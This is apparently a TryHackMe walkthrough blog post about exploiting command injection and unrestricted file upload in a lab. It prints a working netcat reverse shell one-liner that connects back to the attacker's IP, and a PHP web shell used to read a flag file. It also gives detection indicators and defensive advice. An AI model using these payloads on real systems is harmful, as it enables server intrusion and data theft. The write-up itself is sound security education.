---
title: "TryHackMe - Practical WebShell Walkthrough"
date: 2026-06-28 00:01:00 +0700
categories: [TryHackMe, Web Exploitation]
tags:
  - tryhackme
  - reverse-shell
  - web-shell
  - command-injection
  - file-upload
  - linux
image:
#path: /assets/img/posts/thm-webshell-cover.png
author: NoxShepherd
toc: true
comments: true
---

# Overview

Web applications remain one of the most common attack surfaces in modern infrastructures. A single insecure implementation can expose an entire server to remote code execution, allowing attackers to execute arbitrary commands, upload malicious files, and potentially compromise sensitive systems.

In this walkthrough, I will demonstrate how I solved the Practical Task WebShell room on TryHackMe by exploiting two common web application vulnerabilities:
- Command Injection
- Unrestricted File Upload

Both attack paths ultimately provide command execution on the target server, but they leverage different exploitation techniques. Along the way, I will explain not only how each exploit works, but also why it works, the associated risks, and defensive measures that organizations should implement.


> **Disclaimer**
>
> This write-up is intended for educational purposes only. All activities were performed inside the TryHackMe training environment.

---

# Learning Objectives
After completing this room, you should understand:
- How to perform basic reconnaissance
- How Command Injection leads to Remote Code Execution
- How Reverse Shells work internally
- How Web Shells differ from Reverse Shells
- Why unrestricted file uploads are dangerous
- Best practices for mitigating these vulnerabilities


---

# Lab Information

| Item | Value |
|------|------|
| Platform | TryHackMe |
| Target OS | Linux |
| Techniques | Reverse Shell, Web Shell |

|Machine | IP Address|
|--------|-----------|
|Victim Machine | 10.49.164.196|
|Attacker Machine | 10.49.96.122|

|Port | Service | Purpose|
|-----|---------|--------|
|22 | SSH|Remote Administration           |
|80	| HTTP | Web Service                  |
|8080 | Landing Page|                     | 
|8081 | Command Injection Challenge       |	
|8082 | Unrestricted File Upload Challenge|	



---

# Enumeration

Every penetration test begins with information gathering. The first objective is to identify the exposed services and potential attack surfaces.

I started by performing a service version scan using Nmap.


```bash
nmap -sV 10.49.164.196
```

Example output:

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
8081/tcp open  http
8082/tcp open  http
```

From the scan results, two interesting services were identified:

- Port **8081** – vulnerable to Command Injection
- Port **8082** – vulnerable to Unrestricted File Upload

These two services become the primary attack vectors for the remainder of the assessment.

---

# Exploitation — Command Injection

Command Injection occurs when an application executes operating system commands using unsanitized user input.

For example, consider the following vulnerable PHP code:
system("ping " . $_POST['ip']);

If a user submits:
8.8.8.8

the application executes:
ping 8.8.8.8

However, an attacker could instead provide:
8.8.8.8 && whoami
allowing additional commands to execute on the underlying operating system.

This is precisely the weakness exploited in this challenge.

---

# Preparing the Reverse Shell Listener

Before triggering the vulnerability, I prepared a Netcat listener on my attacking machine.

```bash
nc -lvnp 443
```

This listener waits for the incoming reverse shell connection initiated by the target server.

---

# Triggering the Vulnerability

Next, I navigated to:
```bash
http://10.49.164.196:8081
```

Inside the application's input field, I submitted the following reverse shell payload:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.49.96.122 443 >/tmp/f
```

The vulnerable application allowed arbitrary command execution.


## Payload Breakdown

### Remove existing FIFO

```bash
rm -f /tmp/f
```

Deletes any existing named pipe.

---

### Create a FIFO

```bash
mkfifo /tmp/f
```

Creates a communication channel between Netcat and the shell.

---

### Read input

```bash
cat /tmp/f
```

Reads commands from the pipe.

---

### Interactive shell

```bash
sh -i 2>&1
```

Starts an interactive shell and redirects stderr.

---

### Connect back

```bash
nc ATTACKER_IP 443 >/tmp/f
```

Creates the reverse connection to the attacker.

---

# Receiving the Reverse Shell

After submitting the payload, the Netcat listener immediately received a connection.

```bash
Listening on 0.0.0.0 443
Connection received on 10.49.164.196
sh: 0: can't access tty; job control turned off
```

I then verified my access by executing several reconnaissance commands.


```bash
$ whoami
www-data
```

```bash
$ pwd
/var/www/html
```

```bash
$ id
uid=33(www-data)
```

```bash
$ ls /
bin
boot
dev
etc
flag.txt
home
...
```

The shell is running under the www-data account, which is the default Apache web server user on Debian-based systems.

Finally, reading the flag file confirms successful remote command execution.
THM{REDACTED}


> **The flag value has intentionally been omitted to preserve the learning experience.**

---

# Exploitation — Web Shell

Unlike the previous challenge, this application allows users to upload arbitrary files without properly validating their contents. If uploaded files are stored inside the web root and executed by the web server, attackers can gain Remote Code Execution by uploading a simple PHP web shell.

A simple PHP web shell was created.

```bash
root@ip-10-49-96-122:~# mkdir webshell
root@ip-10-49-96-122:~# cd webshell/
root@ip-10-49-96-122:~/webshell# ls
root@ip-10-49-96-122:~/webshell# nano shell.php

<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

root@ip-10-49-96-122:~/webshell# ls
shell.php
root@ip-10-49-96-122:~/webshell# cat shell.php 
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
root@ip-10-49-96-122:~/webshell#
```
---

# How It Works
The script checks whether the URL contains a parameter named cmd.
For example:

shell.php?cmd=whoami
becomes
system("whoami");

allowing arbitrary operating system commands to execute on the server.

---

# Uploading the Web Shell

Then I accessed:
http://10.49.164.196:8082

Using the application's upload functionality, I uploaded shell.php.

After a successful upload, the web shell became accessible via:
http://10.49.164.196:8082/uploads/shell.php



After uploading the file, commands could be executed directly through the browser.

Example:

```text
http://TARGET_IP:8082/uploads/shell.php?cmd=whoami
```

Additional verification commands included:

# Verifying Remote Command Execution
To verify the shell was functioning correctly, I executed several commands directly through the browser.

----

# Determine the current user:

```url
http://10.49.164.196:8082/uploads/shell.php?cmd=whoami

Output:
www-data
```

# Determine the working directory:

```text
http://10.49.164.196:8082/uploads/shell.php?cmd=pwd

Output:
/var/www/html/uploads
```

# List the root directory:

```text
http://10.49.164.196:8082/uploads/shell.php?cmd=ls%20/

Output:
bin
boot
dev
etc
flag.txt
home
...
```

# Read the flag:

```text
http://10.49.164.196:8082/uploads/shell.php?cmd=cat%20/flag.txt

Result:
THM{REDACTED}
```

Again, the flag value has been intentionally removed.

---

# Reverse Shell vs Web Shell

| Reverse Shell | Web Shell |
|---------------|-----------|
| Interactive terminal session | Browser-based command execution |
| Requires a listener | No listener required |
| More stable for long sessions	| Useful for quick command execution |
| Can often be upgraded to a full TTY | Typically limited to HTTP requests|

---

# MITRE ATT&CK Mapping

| Technique	| Description |
|-----------|-------------|
| T1190	| Exploit Public-Facing Application |
| T1059.004	 | Command and Scripting Interpreter: Unix Shell |
| T1105	Ingress | Tool Transfer | 
| T1505.003	| Web Shell| 

---

# OWASP Top 10 Mapping
| Category|Explanation | 
|----------| -----------| 
| A03:2021 – Injection	Unsanitized input leads to arbitrary command execution | 
| A05:2021 – Security Misconfiguration	Executable upload directory enables PHP execution | 
| A01:2021 – Broken Access Control (Potential)	Improper permissions may increase attack impact | 


---

# Detection Opportunities

Blue Teams and SOC analysts can detect these attacks through several indicators:
•	Web server logs containing suspicious characters such as ;, &&, |, or backticks.
•	Requests targeting uploaded PHP files (e.g., shell.php?cmd=).
•	Unusual outbound connections initiated by the web server process.
•	Execution of system binaries (sh, bash, nc) by the web service account (www-data).
•	Unexpected files appearing in upload directories.

Monitoring these indicators can help identify exploitation attempts before attackers establish persistence.

---

# Defensive Recommendations

# Preventing Command Injection
•	Never concatenate user input directly into system commands.
•	Prefer secure APIs over shell execution.
•	Validate input using allowlists rather than blocklists.
•	Disable dangerous PHP functions such as system(), exec(), shell_exec(), and passthru() unless absolutely necessary.

---

# Securing File Uploads
•	Restrict allowed file extensions.
•	Validate MIME types.
•	Rename uploaded files to random names.
•	Store uploads outside the web root.
•	Disable script execution within upload directories.

Example Apache configuration:
php_admin_flag engine off
or
RemoveHandler.php



# Real-World Impact


If exploited in a production environment, these vulnerabilities could allow attackers to:
•	Execute arbitrary operating system commands.
•	Read sensitive configuration files.
•	Steal credentials.
•	Upload persistent backdoors.
•	Deploy ransomware.
•	Pivot to internal systems.
•	Escalate privileges depending on server misconfigurations.

Because of their potential to lead to full server compromise, both Command Injection and Unrestricted File Upload vulnerabilities are commonly classified as Critical findings during penetration tests.

---

# Apply the Principle of Least Privilege
The web server should never run with administrative privileges. Restrict the web service account to only the permissions required for normal operation.


---

# Lessons Learned

This room demonstrates how two common web application vulnerabilities—Command Injection and Unrestricted File Upload—can both result in Remote Code Execution, albeit through different attack paths.
The first technique leveraged a reverse shell payload injected into a vulnerable application to establish an interactive shell, while the second relied on uploading a PHP web shell to execute commands directly through the browser.

Beyond completing the challenge, this exercise reinforces the importance of understanding not only how these vulnerabilities are exploited but also why they occur and how they can be effectively mitigated. For penetration testers, mastering these techniques is essential for identifying and demonstrating real-world risks. For defenders, implementing secure coding practices, rigorous input validation, and proper server hardening remains the best defense against these classes of attacks.

---